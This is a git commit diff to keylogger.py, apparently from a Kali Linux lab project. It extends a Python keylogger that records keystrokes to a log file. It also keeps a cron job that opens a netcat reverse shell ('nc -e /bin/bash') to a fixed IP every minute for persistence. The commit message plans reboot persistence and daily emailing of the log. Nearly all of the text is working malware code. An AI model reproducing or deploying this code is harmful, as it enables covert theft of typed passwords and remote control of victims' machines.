9ecebdeb5830b5e9ecd00ac7fd7d8af4048714e7
brianmancil <85409404+brianmancil@users.noreply.github.com>
2021-11-25 11:44:37 -0500

    Update keylogger.py
    added input for arrow keys, tab, command, and control. next adding more cron jobs to run keylogger.py on reboot and send the log file by email once a day.

--- keylogger.py
+++ keylogger.py
@@ -5,7 +5,7 @@ import logging
 from crontab import CronTab
 
 # Initialize Log File
-logging.basicConfig(filename=("keylog.txt"), level=logging.INFO, format="%(asctime)s-%(message)s")
+logging.basicConfig(filename=("keylog.txt"), level=logging.INFO, format="%(asctime)s - %(message)s")
 # Initialize Variable
 word=''
 # Whenever a key is pressed:
@@ -13,13 +13,24 @@ def on_press(key):
     global word
 
 # If the key is a space or the enter key, log the word go to the next line
-    if key == Key.space or key == Key.enter:
+    if key == Key.space or key == Key.enter or key == Key.tab:
         word += ' '
         logging.info(str(word))
         # Resets the word variable
         word = ''
+    # If an arrow key is pressed, log the word, and the string below
+    elif key == Key.up or key == Key.down or key == Key.left or key == Key.right:
+        word += ' '
+        logging.info(str(word + '-An arrow key was pressed-'))
+        word =''
     # If the key pressed is a shift key, ignore it
     elif key == Key.shift_l or key == Key.shift_r:
+        return
+    # If either control key is pressed, ignore it
+    elif key == Key.ctrl_l or key == Key.ctrl_r:
+        return
+    # If either command/super key is pressed, ignore it
+    elif key == Key.cmd_l or key == Key.cmd_r:
         return
     # If backspace is pressed, remove the last character from the word variable
     elif key == Key.backspace:
@@ -36,10 +47,11 @@ def on_press(key):
 # Calls on the on_press function and keeps it running
 with Listener(on_press=on_press) as listener:
     listener.join()
-    
-# Create a cronjob reverse shell to establish persistence
-my_cron = CronTab(user='kali')
-job = my_cron.new(command='/bin/nc –e /bin/bash 192.168.56.10 4444 >/dev/null 2>&1')
-job.minute.every(1)
 
-my_cron.write()
+# Create a cronjob reverse shell to establish persistence
+rev_cron = CronTab(user='kali')
+job1 = rev_cron.new(command='/bin/nc –e /bin/bash 192.168.56.10 4444 >/dev/null 2>&1')
+job1.minute.every(1)
+
+rev_cron.write()
+
